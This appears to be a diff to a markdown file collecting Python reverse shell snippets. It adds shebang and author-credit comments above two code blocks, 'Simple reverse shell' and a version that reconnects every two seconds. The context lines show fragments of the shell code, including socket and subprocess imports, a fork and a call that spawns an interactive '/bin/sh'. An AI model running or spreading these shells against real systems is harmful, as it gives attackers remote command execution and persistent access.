@@ -34,6 +34,13 @@ dreg@fr33project.org
 ### Simple reverse shell 
 
 ```
+#!/usr/bin/env python
+
+# David Reguera Garcia aka Dreg
+# https://github.com/David-Reguera-Garcia-Dreg/
+# http://www.fr33project.org
+# dreg@fr33project.org
+
 import socket,subprocess,os,sys
 
 pidrg = os.fork()
@@ -76,6 +83,13 @@ p=subprocess.call(["/bin/sh","-i"])
 ### Infinite loop reverse shell each 2 seconds
 
 ```
+#!/usr/bin/env python
+
+# David Reguera Garcia aka Dreg
+# https://github.com/David-Reguera-Garcia-Dreg/
+# http://www.fr33project.org
+# dreg@fr33project.org
+
 import socket,subprocess,os,sys, time
 
 pidrg = os.fork()
